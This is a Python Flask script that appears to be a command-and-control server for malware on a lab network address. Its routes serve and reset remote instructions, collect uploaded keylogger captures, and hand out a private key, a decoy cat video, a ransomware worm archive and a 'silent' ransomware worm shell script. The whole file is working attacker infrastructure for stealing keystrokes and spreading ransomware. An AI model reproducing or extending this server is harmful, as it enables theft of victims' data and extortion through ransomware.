###########################################################################################################################
####################################################     LIBRARIES     ####################################################
###########################################################################################################################

# pip install Flask==2.0.1 Jinja2==3.0.1 --force-reinstall
# pip install --upgrade Flask Werkzeug
from flask import Flask, send_from_directory, request, send_file
from time import time

###########################################################################################################################
#################################################     INITIALIZATIONS     #################################################
###########################################################################################################################

IP_ADDRESS = "10.0.2.15"
PORT = 8000
FILE_TO_SERVE = "./instructions.txt"
SECRET_KEY = "./private.pem"
VIDEO = './cutecats.mp4'
RANSOM_WORM = './ransom_worm.zip'
SILENT_RANSOM_WORM = './silent_ransom_worm.sh'

###########################################################################################################################
#####################################################     PROGRAM     #####################################################
###########################################################################################################################

if __name__ == '__main__':
    app = Flask(__name__)

    @app.route('/')
    def serve_file():
        try: return send_from_directory('.', FILE_TO_SERVE)
        except FileNotFoundError: return "File not found", 404

    @app.route('/reset_instruction', methods=['GET'])
    def reset_instruction():
        with open(FILE_TO_SERVE, 'w') as file:
            file.write('# Write the instruction in the next line!\n') 
        print("\nInstruction reseted!\n")
        return "Instruction reseted!"

    @app.route('/upload_file', methods=['POST'])
    def upload_file():
        if 'file' not in request.files:
            return 'No file provided in the request'
        file = request.files['file']
        # Save the uploaded file to the server's folder
        file.save(f'./keylog_{int(time())}.txt')
        return 'File uploaded successfully'

    @app.route('/send_secret_key')
    def send_secret_key():
        return send_file(SECRET_KEY, as_attachment=True)

    @app.route('/send_video')
    def send_video():
        return send_file(VIDEO, as_attachment=True)

    @app.route('/send_ransomworm')
    def send_ransomworm():
        return send_file(RANSOM_WORM, as_attachment=True)

    @app.route('/send_ransomworm_silent')
    def send_ransomworm_silent():
        return send_file(SILENT_RANSOM_WORM, as_attachment=True)

    if __name__ == '__main__':
        app.run(host=IP_ADDRESS, port=PORT, debug=True)